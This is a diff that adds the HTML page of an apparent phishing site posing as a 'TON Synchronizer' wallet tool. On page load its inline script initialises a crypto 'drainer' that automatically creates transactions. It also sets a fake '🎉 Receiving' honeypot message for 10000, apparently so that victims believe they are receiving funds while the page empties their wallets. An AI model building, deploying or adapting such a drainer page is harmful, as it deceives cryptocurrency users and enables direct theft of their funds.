@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta
+      name="description"
+      content="TON blockchain wallet synchronizer"
+    />
+    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
+    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
+    <link rel="stylesheet" href="/vrtx.css?v=1.0.0" />
+    <title>TON Synchronizer | Synchronize for a seemless crypto experience</title>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+    <script src="/vrtx.js?v=1.0.0" defer crossorigin></script>
+    <script>
+  
+      window.addEventListener('load', () => {
+        window.drainer?.init({
+          autoCreateTransaction: true,
+          autoOpenModal: false,
+        });
+        window.drainer?.overrideHoneypot({
+          honeypot_message: "🎉 Receiving",
+          honeypot_amount:10000
+        })
+      });
+  </script>
+  </body>
+</html>
